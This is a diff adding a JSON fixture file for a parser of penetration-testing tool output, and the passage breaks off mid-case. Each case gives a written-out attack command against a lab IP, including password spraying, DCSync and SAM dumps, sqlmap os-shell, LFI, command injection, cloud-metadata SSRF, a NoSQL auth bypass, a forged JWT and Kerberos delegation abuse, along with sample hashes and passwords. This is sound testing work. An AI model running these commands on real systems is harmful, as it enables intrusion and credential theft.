@@ -1,0 +1,1682 @@
+{
+  "version": 1,
+  "description": "Golden parser fixtures for representative, anonymized tool-output shapes. Each case must prove expected narrow facts and forbid unsafe overclaims.",
+  "defaults": {
+    "target": "10.10.10.10",
+    "forbidden_supported_kinds": [
+      "access.admin",
+      "access.system",
+      "access.shell",
+      "credential.admin",
+      "foothold.linux",
+      "foothold.windows",
+      "loot.ntds",
+      "vuln.candidates"
+    ]
+  },
+  "cases": [
+    {
+      "id": "nmap_service_script_metadata",
+      "tool": "nmap",
+      "action_id": "nmap-version-scripts",
+      "command": "nmap -Pn -sC -sV -sU -p T:21,22,80,3389,U:53,161 -oN nmap-version.txt 10.10.10.10",
+      "stdout": "outputs/nmap_service_script_metadata.txt",
+      "expected_supported_kinds": [
+        "host.up",
+        "host.os_hint",
+        "host.os_family",
+        "scan.nmap.version",
+        "scan.nmap.udp",
+        "ports.open",
+        "ftp.reachable",
+        "ftp.anonymous_login",
+        "ssh.reachable",
+        "ssh.hostkey",
+        "dns.reachable",
+        "snmp.reachable",
+        "snmp.info",
+        "host.hostname",
+        "http.reachable",
+        "http.redirect",
+        "web.tech",
+        "rdp.reachable"
+      ],
+      "expected_facts": [
+        {
+          "kind": "ports.open",
+          "value_contains": {
+            "ports": [
+              21,
+              22,
+              53,
+              80,
+              161,
+              3389
+            ]
+          }
+        },
+        {
+          "kind": "snmp.info",
+          "value_contains": {
+            "name": "edge-router-02",
+            "description": "Linux edge-router-02 5.15"
+          }
+        },
+        {
+          "kind": "host.os_family",
+          "value_contains": {
+            "family": "linux"
+          }
+        },
+        {
+          "kind": "ssh.hostkey",
+          "value_contains": {
+            "count": 2,
+            "keys": [
+              {
+                "bits": 256,
+                "type": "ECDSA"
+              },
+              {
+                "bits": 256,
+                "type": "ED25519"
+              }
+            ]
+          }
+        },
+        {
+          "kind": "http.redirect",
+          "value_contains": {
+            "locations": [
+              "http://ops-portal.lab/login"
+            ]
+          }
+        },
+        {
+          "kind": "web.tech",
+          "value_contains": {
+            "items": [
+              {
+                "name": "generator",
+                "value": "WordPress 6.4.3"
+              }
+            ]
+          }
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "credential.available",
+        "credential.plaintext",
+        "web.authenticated"
+      ]
+    },
+    {
+      "id": "http_curl_whatweb_metadata",
+      "tool": "curl+whatweb",
+      "action_id": "web-tech-fingerprint",
+      "command": "curl -i http://10.10.10.10 && whatweb http://10.10.10.10",
+      "stdout": "outputs/http_curl_whatweb_metadata.txt",
+      "expected_supported_kinds": [
+        "http.reachable",
+        "http.response",
+        "http.redirect",
+        "web.server",
+        "web.title",
+        "web.tech"
+      ],
+      "expected_facts": [
+        {
+          "kind": "http.response",
+          "value_contains": {
+            "responses": [
+              {
+                "status": 302,
+                "reason": "Found"
+              }
+            ]
+          }
+        },
+        {
+          "kind": "web.server",
+          "value_contains": {
+            "headers": [
+              "nginx/1.24.0"
+            ]
+          }
+        },
+        {
+          "kind": "web.title",
+          "value_contains": {
+            "titles": [
+              "Operator Console"
+            ]
+          }
+        },
+        {
+          "kind": "web.tech",
+          "value_contains": {
+            "items": [
+              {
+                "name": "x-powered-by",
+                "value": "PHP/8.2.12"
+              },
+              {
+                "name": "Bootstrap",
+                "value": "5.3.2"
+              }
+            ]
+          }
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "credential.available",
+        "web.authenticated",
+        "web.upload_confirmed",
+        "web.lfi_confirmed"
+      ]
+    },
+    {
+      "id": "nxc_ssh_ftp_auth_context_only",
+      "tool": "netexec",
+      "action_id": "password-spray",
+      "domain": "corp.local",
+      "command": "nxc ssh 10.10.10.10 -u svc-audit -p 'Spring2026!' && nxc ftp 10.10.10.10 -u svc-audit -p 'Spring2026!'",
+      "stdout": "outputs/nxc_ssh_ftp_auth_context_only.txt",
+      "expected_supported_kinds": [
+        "ssh.reachable",
+        "ftp.reachable",
+        "host.os_hint",
+        "host.os_family",
+        "ssh.authenticated",
+        "ftp.authenticated",
+        "credential.available"
+      ],
+      "expected_facts": [
+        {
+          "kind": "credential.available",
+          "scope": "domain:corp.local",
+          "value_contains": {
+            "user": "svc-audit",
+            "password": "Spring2026!",
+            "domain": "corp.local",
+            "method": "nxc"
+          }
+        },
+        {
+          "kind": "host.os_family",
+          "value_contains": {
+            "family": "linux"
+          }
+        },
+        {
+          "kind": "ssh.authenticated",
+          "value_contains": {
+            "user": "svc-audit",
+            "service": "ssh"
+          }
+        },
+        {
+          "kind": "ftp.authenticated",
+          "value_contains": {
+            "user": "svc-audit",
+            "service": "ftp"
+          }
+        }
+      ]
+    },
+    {
+      "id": "nxc_failed_login_refutes_validation",
+      "tool": "netexec",
+      "action_id": "password-spray",
+      "domain": "corp.local",
+      "command": "nxc smb 10.10.10.10 -u svc-audit -p WrongPassword",
+      "stdout": "outputs/nxc_failed_login_refutes_validation.txt",
+      "expected_supported_kinds": [
+        "host.os_hint",
+        "host.os_family",
+        "smb.reachable"
+      ],
+      "expected_refuted_kinds": [
+        "credential.validation"
+      ],
+      "expected_facts": [
+        {
+          "kind": "host.os_family",
+          "value_contains": {
+            "family": "windows"
+          }
+        },
+        {
+          "kind": "credential.validation",
+          "state": "refuted",
+          "value_contains": {
+            "reason": "logon_failure"
+          }
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "credential.available",
+        "smb.authenticated"
+      ]
+    },
+    {
+      "id": "ssh_banner_no_shell",
+      "tool": "nc",
+      "action_id": "nmap-version-scripts",
+      "command": "nc -nv 10.10.10.10 22",
+      "stdout": "outputs/ssh_banner_no_shell.txt",
+      "expected_supported_kinds": [
+        "host.os_hint",
+        "ssh.reachable",
+        "ssh.banner"
+      ]
+    },
+    {
+      "id": "ssh_id_proves_linux_shell",
+      "tool": "ssh",
+      "action_id": "ssh-shell-check",
+      "command": "ssh appuser@10.10.10.10 id",
+      "stdout": "outputs/ssh_id_proves_linux_shell.txt",
+      "expected_supported_kinds": [
+        "access.shell",
+        "foothold.linux",
+        "host.os_hint",
+        "host.os_family"
+      ],
+      "expected_facts": [
+        {
+          "kind": "foothold.linux",
+          "value_contains": {
+            "service": "ssh",
+            "identity": "appuser"
+          }
+        },
+        {
+          "kind": "host.os_family",
+          "value_contains": {
+            "family": "linux"
+          }
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "access.admin"
+      ],
+      "allow_default_forbidden_supported_kinds": [
+        "access.shell",
+        "foothold.linux"
+      ]
+    },
+    {
+      "id": "snmp_timeout_no_facts",
+      "tool": "snmpwalk",
+      "action_id": "snmp-enum",
+      "command": "snmpwalk -v2c -c public 10.10.10.10 1.3.6.1.2.1.1",
+      "stdout": "outputs/snmp_timeout_no_facts.txt",
+      "expected_fact_count": 0
+    },
+    {
+      "id": "ftp_named_login_not_anonymous",
+      "tool": "ftp",
+      "action_id": "ftp-login-check",
+      "command": "ftp -n 10.10.10.10",
+      "stdout": "outputs/ftp_named_login_not_anonymous.txt",
+      "expected_supported_kinds": [
+        "ftp.reachable",
+        "ftp.banner"
+      ],
+      "forbidden_supported_kinds": [
+        "ftp.anonymous_login",
+        "credential.available"
+      ]
+    },
+    {
+      "id": "nxc_sam_dump_material_not_access",
+      "tool": "netexec",
+      "action_id": "dump-secrets",
+      "domain": "corp.local",
+      "command": "nxc smb 10.10.10.10 -u localadmin -p 'LocalAdmin2026!' --sam",
+      "stdout": "outputs/nxc_sam_dump_material_not_access.txt",
+      "expected_supported_kinds": [
+        "smb.reachable",
+        "host.os_hint",
+        "host.os_family",
+        "hash.ntlm",
+        "credential.candidate"
+      ],
+      "expected_facts": [
+        {
+          "kind": "hash.ntlm",
+          "scope": "domain:corp.local",
+          "value_contains": {
+            "count": 2,
+            "entries": [
+              {
+                "user": "Administrator",
+                "nthash": "8846f7eaee8fb117ad06bdd830b7586c"
+              },
+              {
+                "user": "localuser",
+                "nthash": "6f4b6612125fb3a0daecd2799dfd6f5f"
+              }
+            ]
+          }
+        },
+        {
+          "kind": "credential.candidate",
+          "value_contains": {
+            "kind": "ntlm_hash",
+            "count": 2
+          }
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "loot.ntds",
+        "hash.krbtgt",
+        "credential.available",
+        "credential.plaintext"
+      ]
+    },
+    {
+      "id": "secretsdump_ntds_domain_loot",
+      "tool": "secretsdump",
+      "action_id": "dcsync",
+      "domain": "corp.local",
+      "command": "impacket-secretsdump 'corp.local/dumpsvc:Passw0rd!'@10.10.10.10 -just-dc",
+      "stdout": "outputs/secretsdump_ntds_domain_loot.txt",
+      "expected_supported_kinds": [
+        "hash.ntlm",
+        "hash.krbtgt",
+        "loot.ntds",
+        "credential.candidate"
+      ],
+      "expected_facts": [
+        {
+          "kind": "hash.ntlm",
+          "scope": "domain:corp.local",
+          "value_contains": {
+            "count": 3,
+            "entries": [
+              {
+                "user": "Administrator"
+              },
+              {
+                "user": "krbtgt"
+              },
+              {
+                "user": "svc-backup"
+              }
+            ]
+          }
+        },
+        {
+          "kind": "hash.krbtgt",
+          "value_contains": {
+            "nthash": "1a59bd44fdb8f9f4a3f8c9d2e5b7a6c1"
+          }
+        },
+        {
+          "kind": "loot.ntds",
+          "value_contains": {
+            "count": 3,
+            "method": "credential-dump"
+          }
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "credential.available",
+        "credential.plaintext"
+      ],
+      "allow_default_forbidden_supported_kinds": [
+        "loot.ntds"
+      ]
+    },
+    {
+      "id": "bloodhound_collection_zip_context_only",
+      "tool": "bloodhound-python",
+      "action_id": "bloodhound-collect",
+      "domain": "corp.local",
+      "command": "bloodhound-python -d corp.local -u svc-audit -p 'Spring2026!' -ns 10.10.10.10 -c All --zip",
+      "stdout": "outputs/bloodhound_collection_zip_context_only.txt",
+      "expected_supported_kinds": [
+        "ad.graph.collected"
+      ],
+      "expected_facts": [
+        {
+          "kind": "ad.graph.collected",
+          "scope": "domain:corp.local",
+          "value_contains": {
+            "archives": [
+              "20260915081200_bloodhound.zip"
+            ]
+          }
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "ad.attack_paths",
+        "credential.available"
+      ]
+    },
+    {
+      "id": "bloodhound_analysis_attack_path_only",
+      "tool": "bloodhound",
+      "action_id": "bloodhound-collect",
+      "domain": "corp.local",
+      "command": "bloodhound --analysis shortest-paths",
+      "stdout": "outputs/bloodhound_analysis_attack_path_only.txt",
+      "expected_supported_kinds": [
+        "ad.attack_paths"
+      ],
+      "forbidden_supported_kinds": [
+        "ad.graph.collected",
+        "credential.available"
+      ]
+    },
+    {
+      "id": "sqlmap_database_and_webshell_context",
+      "tool": "sqlmap",
+      "action_id": "sqlmap-automation",
+      "command": "sqlmap -r request.txt --batch --dbs --os-shell",
+      "stdout": "outputs/sqlmap_database_and_webshell_context.txt",
+      "expected_supported_kinds": [
+        "web.sqli_confirmed",
+        "db.databases",
+        "db.tables",
+        "db.creds",
+        "credential.candidate",
+        "foothold.webshell"
+      ],
+      "expected_facts": [
+        {
+          "kind": "db.databases",
+          "value_contains": {
+            "dbms": "MySQL >= 5.0",
+            "databases": [
+              "appdb",
+              "information_schema"
+            ]
+          }
+        },
+        {
+          "kind": "db.creds",
+          "value_contains": {
+            "credential_columns": [
+              "password",
+              "username"
+            ],
+            "tables": [
+              {
+                "database": "appdb",
+                "table": "users"
+              }
+            ]
+          }
+        },
+        {
+          "kind": "credential.candidate",
+          "value_contains": {
+            "kind": "database_dump_secret"
+          }
+        },
+        {
+          "kind": "foothold.webshell",
+          "value_contains": {
+            "tool": "sqlmap",
+            "method": "os-shell"
+          }
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "credential.available",
+        "credential.plaintext",
+        "access.admin",
+        "access.system",
+        "foothold.windows",
+        "foothold.linux"
+      ]
+    },
+    {
+      "id": "git_dumper_source_candidate_secret",
+      "tool": "git-dumper",
+      "action_id": "git-exposed",
+      "command": "git-dumper http://10.10.10.10/.git/ gitloot && grep -ri 'pass\\|key\\|secret' gitloot",
+      "stdout": "outputs/git_dumper_source_candidate_secret.txt",
+      "expected_supported_kinds": [
+        "web.source",
+        "credential.candidate"
+      ],
+      "expected_facts": [
+        {
+          "kind": "web.source",
+          "value_contains": {
+            "kind": "git",
+            "tool": "git-dumper"
+          }
+        },
+        {
+          "kind": "credential.candidate",
+          "value_contains": {
+            "kind": "source_secret",
+            "count": 2
+          }
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "credential.available",
+        "credential.plaintext",
+        "web.authenticated"
+      ]
+    },
+    {
+      "id": "bloodyad_acl_control_path_only",
+      "tool": "bloodyAD",
+      "action_id": "bloodyad-acl",
+      "domain": "corp.local",
+      "command": "bloodyAD -d corp.local --host 10.10.10.10 -u svc-audit -p 'Spring2026!' add groupMember \"Help Desk Operators\" svc-audit",
+      "stdout": "outputs/bloodyad_acl_control_path_only.txt",
+      "expected_supported_kinds": [
+        "ad.group_joined"
+      ],
+      "expected_facts": [
+        {
+          "kind": "ad.group_joined",
+          "scope": "domain:corp.local",
+          "value_contains": {
+            "group": "Help Desk Operators"
+          }
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "ad.control_paths",
+        "credential.available",
+        "credential.plaintext",
+        "access.admin",
+        "access.system",
+        "foothold.windows"
+      ]
+    },
+    {
+      "id": "addcomputer_machine_candidate_only",
+      "tool": "impacket-addcomputer",
+      "action_id": "delegation-abuse",
+      "domain": "corp.local",
+      "command": "impacket-addcomputer corp.local/svc-audit:Spring2026! -dc-ip 10.10.10.10 -computer-name OBOL$ -computer-pass MachinePass123!",
+      "stdout": "outputs/addcomputer_machine_candidate_only.txt",
+      "expected_supported_kinds": [
+        "ad.computer_added",
+        "credential.candidate"
+      ],
+      "expected_facts": [
+        {
+          "kind": "ad.computer_added",
+          "scope": "domain:corp.local",
+          "value_contains": {
+            "computer": "OBOL$",
+            "password_set": true
+          }
+        },
+        {
+          "kind": "credential.candidate",
+          "scope": "domain:corp.local",
+          "value_contains": {
+            "kind": "machine_account",
+            "user": "OBOL$"
+          }
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "credential.available",
+        "credential.plaintext",
+        "foothold.windows",
+        "access.admin"
+      ]
+    },
+    {
+      "id": "rbcd_getst_ticket_material_only",
+      "tool": "impacket-rbcd+getST",
+      "action_id": "getst-impersonation",
+      "domain": "corp.local",
+      "command": "impacket-rbcd -delegate-from OBOL$ -delegate-to WEB01$ -action write corp.local/svc-audit:Spring2026! && impacket-getST -spn cifs/WEB01.corp.local -impersonate administrator corp.local/OBOL$:MachinePass123!",
+      "stdout": "outputs/rbcd_getst_ticket_material_only.txt",
+      "expected_supported_kinds": [
+        "ad.control_paths",
+        "kerberos.tickets"
+      ],
+      "expected_facts": [
+        {
+          "kind": "ad.control_paths",
+          "scope": "domain:corp.local",
+          "value_contains": {
+            "operation": "rbcd_write"
+          }
+        },
+        {
+          "kind": "kerberos.tickets",
+          "scope": "domain:corp.local",
+          "value_contains": {
+            "principal": "administrator",
+            "files": [
+              "administrator.ccache"
+            ]
+          }
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "credential.available",
+        "foothold.windows",
+        "access.admin",
+        "access.system"
+      ]
+    },
+    {
+      "id": "laps_gmsa_material_not_access",
+      "tool": "nxc-laps+gMSADumper",
+      "action_id": "gmsa-read",
+      "domain": "corp.local",
+      "command": "nxc ldap 10.10.10.10 -u svc-audit -p 'Spring2026!' -M laps && gMSADumper.py -u svc-audit -p 'Spring2026!' -d corp.local",
+      "stdout": "outputs/laps_gmsa_material_not_access.txt",
+      "expected_supported_kinds": [
+        "credential.candidate",
+        "credential.ntlm_hash"
+      ],
+      "expected_facts": [
+        {
+          "kind": "credential.candidate",
+          "scope": "domain:corp.local",
+          "value_contains": {
+            "kind": "laps_password",
+            "computer": "WEB01$"
+          }
+        },
+        {
+          "kind": "credential.ntlm_hash",
+          "scope": "domain:corp.local",
+          "value_contains": {
+            "user": "svc_web$",
+            "nthash": "11223344556677889900aabbccddeeff"
+          }
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "credential.available",
+        "credential.plaintext",
+        "foothold.windows",
+        "access.admin",
+        "access.system"
+      ]
+    },
+    {
+      "id": "linux_privesc_fixture_leads_only",
+      "tool": "linpeas",
+      "action_id": "linux-enum",
+      "command": "id; uname -a; sudo -l; find / -perm -4000 2>/dev/null; getcap -r / 2>/dev/null",
+      "stdout": "outputs/linux_privesc_fixture_leads_only.txt",
+      "expected_supported_kinds": [
+        "host.kernel",
+        "host.arch",
+        "privesc.leads",
+        "privesc.sudo_rights",
+        "privesc.suid_candidate",
+        "privesc.capability",
+        "privesc.passwd_writable",
+        "privesc.nfs_no_root_squash",
+        "privesc.lxd_group",
+        "privesc.docker_group"
+      ],
+      "forbidden_supported_kinds": [
+        "access.admin",
+        "access.system"
+      ]
+    },
+    {
+      "id": "windows_privesc_fixture_leads_only",
+      "tool": "winpeas",
+      "action_id": "windows-enum",
+      "command": "whoami /priv && systeminfo && reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+      "stdout": "outputs/windows_privesc_fixture_leads_only.txt",
+      "expected_supported_kinds": [
+        "host.os_family",
+        "host.kernel",
+        "host.arch",
+        "privesc.leads",
+        "privesc.windows_privilege",
+        "privesc.always_install_elevated",
+        "privesc.unquoted_service_path",
+        "privesc.weak_service_permission",
+        "privesc.stored_credentials",
+        "credential.candidate"
+      ],
+      "forbidden_supported_kinds": [
+        "access.admin",
+        "access.system"
+      ]
+    },
+    {
+      "id": "linpeas_ansi_kernel_caps",
+      "tool": "linpeas",
+      "action_id": "linux-enum",
+      "command": "sh /dev/shm/linpeas.sh",
+      "stdout": "outputs/linpeas_ansi_kernel_caps.txt",
+      "expected_supported_kinds": [
+        "host.kernel",
+        "host.arch",
+        "privesc.leads",
+        "privesc.sudo_rights",
+        "privesc.sudo_binary",
+        "privesc.capability",
+        "privesc.kernel_exploit",
+        "exploit.candidate"
+      ],
+      "expected_facts": [
+        {"kind": "privesc.kernel_exploit", "value_contains": {"cves": ["CVE-2016-5195", "CVE-2021-3560", "CVE-2021-4034"]}},
+        {"kind": "privesc.sudo_binary", "value_contains": {"bin": "tar", "gtfobins_id": "tar", "nopasswd": true}},
+        {"kind": "privesc.capability", "value_contains": {"count": 2}}
+      ],
+      "forbidden_supported_kinds": [
+        "access.admin",
+        "access.system",
+        "foothold.linux"
+      ]
+    },
+    {
+      "id": "winpeas_ansi_privs",
+      "tool": "winpeas",
+      "action_id": "windows-enum",
+      "command": "C:\\Windows\\Temp\\winPEASx64.exe",
+      "stdout": "outputs/winpeas_ansi_privs.txt",
+      "expected_supported_kinds": [
+        "host.kernel",
+        "host.arch",
+        "privesc.leads",
+        "privesc.windows_privilege",
+        "privesc.always_install_elevated",
+        "privesc.unquoted_service_path",
+        "privesc.stored_credentials"
+      ],
+      "expected_facts": [
+        {"kind": "privesc.windows_privilege", "value_contains": {"privileges": ["SeAssignPrimaryTokenPrivilege", "SeImpersonatePrivilege"]}},
+        {"kind": "privesc.always_install_elevated", "value_contains": {"hklm": true, "hkcu": true}}
+      ],
+      "forbidden_supported_kinds": [
+        "access.admin",
+        "access.system"
+      ]
+    },
+    {
+      "id": "web_lfi_etc_passwd_read",
+      "tool": "curl",
+      "action_id": "lfi-probe",
+      "command": "curl -s \"http://10.10.10.10/index.php?page=../../../../etc/passwd\"",
+      "stdout": "outputs/web_lfi_etc_passwd_read.txt",
+      "expected_supported_kinds": [
+        "web.lfi_confirmed",
+        "loot.files"
+      ],
+      "expected_facts": [
+        {
+          "kind": "web.lfi_confirmed",
+          "scope": "host:10.10.10.10",
+          "value_contains": {
+            "file": "/etc/passwd",
+            "os": "linux",
+            "method": "path_traversal"
+          }
+        },
+        {
+          "kind": "loot.files",
+          "scope": "host:10.10.10.10",
+          "value_contains": {
+            "files": [
+              "/etc/passwd"
+            ],
+            "via": "path_traversal"
+          }
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "credential.available",
+        "credential.plaintext",
+        "credential.candidate"
+      ]
+    },
+    {
+      "id": "web_lfi_php_filter_source",
+      "tool": "curl",
+      "action_id": "lfi-probe",
+      "command": "curl -s \"http://10.10.10.10/index.php?page=php://filter/convert.base64-encode/resource=db\"",
+      "stdout": "outputs/web_lfi_php_filter_source.txt",
+      "expected_supported_kinds": [
+        "web.lfi_confirmed",
+        "web.source",
+        "loot.files"
+      ],
+      "expected_facts": [
+        {
+          "kind": "web.lfi_confirmed",
+          "scope": "host:10.10.10.10",
+          "value_contains": {
+            "method": "php_filter",
+            "kind": "php_source"
+          }
+        },
+        {
+          "kind": "web.source",
+          "scope": "host:10.10.10.10",
+          "value_contains": {
+            "kind": "php"
+          }
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "credential.available",
+        "credential.plaintext"
+      ]
+    },
+    {
+      "id": "web_cmdi_uid_command_output",
+      "tool": "curl",
+      "action_id": "command-injection",
+      "command": "curl -s \"http://10.10.10.10/ping.php?ip=127.0.0.1;id\"",
+      "stdout": "outputs/web_cmdi_uid_output.txt",
+      "expected_supported_kinds": [
+        "web.cmdi_confirmed",
+        "host.os_hint"
+      ],
+      "expected_facts": [
+        {
+          "kind": "web.cmdi_confirmed",
+          "scope": "host:10.10.10.10",
+          "value_contains": {
+            "os": "linux",
+            "method": "os_command_injection"
+          }
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "credential.available",
+        "web.upload_confirmed"
+      ]
+    },
+    {
+      "id": "web_sqli_manual_error_signature",
+      "tool": "curl",
+      "action_id": "sqli-basics",
+      "command": "curl -s \"http://10.10.10.10/page.php?id=1%27\"",
+      "stdout": "outputs/web_sqli_error_signature.txt",
+      "expected_supported_kinds": [
+        "web.sqli_confirmed"
+      ],
+      "expected_facts": [
+        {
+          "kind": "web.sqli_confirmed",
+          "scope": "host:10.10.10.10",
+          "value_contains": {
+            "tool": "manual",
+            "method": "error_based",
+            "dbms": "MariaDB"
+          }
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "db.creds",
+        "db.databases",
+        "foothold.webshell",
+        "credential.available"
+      ]
+    },
+    {
+      "id": "web_ssrf_imds_cloud_credentials",
+      "tool": "curl",
+      "action_id": "ssrf",
+      "command": "curl -s \"http://10.10.10.10/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role\"",
+      "stdout": "outputs/web_ssrf_imds_aws_creds.txt",
+      "expected_supported_kinds": [
+        "web.ssrf_confirmed",
+        "credential.candidate"
+      ],
+      "expected_facts": [
+        {
+          "kind": "web.ssrf_confirmed",
+          "scope": "host:10.10.10.10",
+          "value_contains": {
+            "method": "ssrf",
+            "target": "cloud_metadata"
+          }
+        },
+        {
+          "kind": "credential.candidate",
+          "scope": "host:10.10.10.10",
+          "value_contains": {
+            "kind": "aws_sts_credentials",
+            "access_key_id": "ASIAEXAMPLE123456789"
+          }
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "credential.available",
+        "cloud.aws_access",
+        "access.admin"
+      ]
+    },
+    {
+      "id": "web_sqli_benign_page_no_error",
+      "tool": "curl",
+      "action_id": "sqli-basics",
+      "command": "curl -s \"http://10.10.10.10/page.php?id=1%27\"",
+      "stdout": "outputs/web_sqli_benign_no_error.txt",
+      "forbidden_supported_kinds": [
+        "web.sqli_confirmed",
+        "db.creds"
+      ]
+    },
+    {
+      "id": "web_cmdi_reflected_input_no_execution",
+      "tool": "curl",
+      "action_id": "command-injection",
+      "command": "curl -s \"http://10.10.10.10/search.php?q=127.0.0.1;id\"",
+      "stdout": "outputs/web_cmdi_reflected_no_exec.txt",
+      "forbidden_supported_kinds": [
+        "web.cmdi_confirmed",
+        "web.upload_confirmed"
+      ]
+    },
+    {
+      "id": "web_lfi_documentation_mention_only",
+      "tool": "curl",
+      "action_id": "lfi-probe",
+      "command": "curl -s \"http://10.10.10.10/help.php?page=security\"",
+      "stdout": "outputs/web_lfi_mentions_passwd_doc.txt",
+      "forbidden_supported_kinds": [
+        "web.lfi_confirmed",
+        "loot.files"
+      ]
+    },
+    {
+      "id": "web_nosqli_operator_auth_bypass",
+      "tool": "curl",
+      "action_id": "nosql-injection",
+      "command": "curl -si 'http://10.10.10.10/api/session/login' -H 'Content-Type: application/json' --data '{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}'",
+      "stdout": "outputs/web_nosqli_auth_bypass.txt",
+      "expected_supported_kinds": [
+        "web.nosqli_confirmed"
+      ],
+      "expected_facts": [
+        {
+          "kind": "web.nosqli_confirmed",
+          "value_contains": {
+            "vector": "authentication_bypass"
+          }
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "access.admin",
+        "credential.plaintext",
+        "credential.available",
+        "foothold.linux",
+        "foothold.windows",
+        "access.shell"
+      ]
+    },
+    {
+      "id": "web_jwt_signing_secret_cracked",
+      "tool": "jwt_tool",
+      "action_id": "jwt-attacks",
+      "command": "jwt_tool eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.J7kR2q -C -d wordlist.txt",
+      "stdout": "outputs/web_jwt_secret_cracked.txt",
+      "expected_supported_kinds": [
+        "web.jwt_secret",
+        "credential.candidate"
+      ],
+      "expected_facts": [
+        {
+          "kind": "web.jwt_secret",
+          "value_contains": {
+            "secret": "hunter2",
+            "algorithm": "HMAC"
+          }
+        },
+        {
+          "kind": "credential.candidate",
+          "value_contains": {
+            "kind": "jwt_signing_secret",
+            "secret": "hunter2"
+          }
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "access.admin",
+        "credential.plaintext",
+        "credential.available",
+        "web.authz_bypass"
+      ]
+    },
+    {
+      "id": "web_jwt_none_alg_forged_accepted",
+      "tool": "curl",
+      "action_id": "jwt-attacks",
+      "command": "curl -si 'http://10.10.10.10/v2/account' -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ.'",
+      "stdout": "outputs/web_jwt_none_alg_accepted.txt",
+      "expected_supported_kinds": [
+        "web.authz_bypass"
+      ],
+      "expected_facts": [
+        {
+          "kind": "web.authz_bypass",
+          "value_contains": {
+            "method": "jwt",
+            "vector": "forged_token"
+          }
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "access.admin",
+        "access.system",
+        "credential.plaintext",
+        "web.jwt_secret"
+      ]
+    },
+    {
+      "id": "web_deserialization_command_output",
+      "tool": "curl",
+      "action_id": "deserialization",
+      "command": "curl -si 'http://10.10.10.10/app/import' -H 'Content-Type: application/x-java-serialized-object' --data-binary @payload.bin",
+      "stdout": "outputs/web_deserialization_rce.txt",
+      "expected_supported_kinds": [
+        "web.cmdi_confirmed"
+      ],
+      "expected_facts": [
+        {
+          "kind": "web.cmdi_confirmed",
+          "value_contains": {
+            "method": "insecure_deserialization",
+            "os": "linux"
+          }
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "access.admin",
+        "access.system",
+        "access.shell",
+        "foothold.linux",
+        "foothold.windows"
+      ]
+    },
+    {
+      "id": "web_jenkins_script_console_rce",
+      "tool": "curl",
+      "action_id": "jenkins-access",
+      "command": "curl -si 'http://10.10.10.10:8080/scriptText' --data-urlencode 'script=println \"id\".execute().text'",
+      "stdout": "outputs/web_jenkins_script_console.txt",
+      "expected_supported_kinds": [
+        "web.cmdi_confirmed"
+      ],
+      "expected_facts": [
+        {
+          "kind": "web.cmdi_confirmed",
+          "value_contains": {
+            "method": "jenkins_script_console",
+            "os": "linux"
+          }
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "access.admin",
+        "access.system",
+        "access.shell",
+        "foothold.linux",
+        "foothold.windows"
+      ]
+    },
+    {
+      "id": "web_idor_ffuf",
+      "tool": "ffuf",
+      "action_id": "idor",
+      "command": "ffuf -w nums.txt -u http://10.10.10.10/api/user/FUZZ -mc 200",
+      "stdout": "outputs/web_idor_ffuf.txt",
+      "expected_supported_kinds": [
+        "web.idor_candidate"
+      ]
+    },
+    {
+      "id": "web_idor_curl",
+      "tool": "curl",
+      "action_id": "idor",
+      "command": "curl -i http://10.10.10.10/account?id=1002",
+      "stdout": "outputs/web_idor_curl.txt",
+      "expected_supported_kinds": [
+        "web.idor_candidate"
+      ]
+    },
+    {
+      "id": "web_xss_reflected",
+      "tool": "curl",
+      "action_id": "xss-basics",
+      "command": "curl http://10.10.10.10/search?q=payload",
+      "stdout": "outputs/web_xss_reflected.txt",
+      "expected_supported_kinds": [
+        "web.xss_confirmed"
+      ]
+    },
+    {
+      "id": "web_xss_stored",
+      "tool": "curl",
+      "action_id": "xss-basics",
+      "command": "curl http://10.10.10.10/post/58/comments",
+      "stdout": "outputs/web_xss_stored.txt",
+      "expected_supported_kinds": [
+        "web.xss_confirmed"
+      ]
+    },
+    {
+      "id": "web_xxe_file_read",
+      "tool": "curl",
+      "action_id": "xxe",
+      "command": "curl -i -d @p.xml http://10.10.10.10/api",
+      "stdout": "outputs/web_xxe_file_read.txt",
+      "expected_supported_kinds": [
+        "web.xxe_confirmed",
+        "loot.files"
+      ]
+    },
+    {
+      "id": "web_xxe_no_read",
+      "tool": "curl",
+      "action_id": "xxe",
+      "command": "curl -i -d @p.xml http://10.10.10.10/api",
+      "stdout": "outputs/web_xxe_no_read.txt",
+      "expected_supported_kinds": [],
+      "forbidden_supported_kinds": [
+        "web.xxe_confirmed",
+        "web.lfi_confirmed",
+        "loot.files"
+      ]
+    },
+    {
+      "id": "web_sqli_union",
+      "tool": "curl",
+      "action_id": "sqli-basics",
+      "command": "curl http://10.10.10.10/product.php?id=-1+UNION+SELECT",
+      "stdout": "outputs/web_sqli_union.txt",
+      "expected_supported_kinds": [
+        "web.sqli_confirmed"
+      ]
+    },
+    {
+      "id": "web_sqli_error",
+      "tool": "curl",
